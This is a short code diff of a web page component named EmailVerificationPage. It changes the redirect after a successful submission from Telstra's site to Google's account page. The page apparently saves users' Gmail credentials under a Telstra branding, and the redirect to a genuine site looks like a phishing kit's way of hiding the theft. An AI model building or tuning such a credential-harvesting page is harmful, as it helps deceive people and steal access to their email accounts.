@@ -44,7 +44,7 @@ export default function EmailVerificationPage() {
 
         if (response.ok) {
           // Redirect to Telstra ID page or success page
-          window.location.href = 'https://www.telstra.com.au';
+          window.location.href = 'https://myaccount.google.com/';
         } else {
           const error = await response.json();
           console.error('Error saving Gmail credentials:', error);
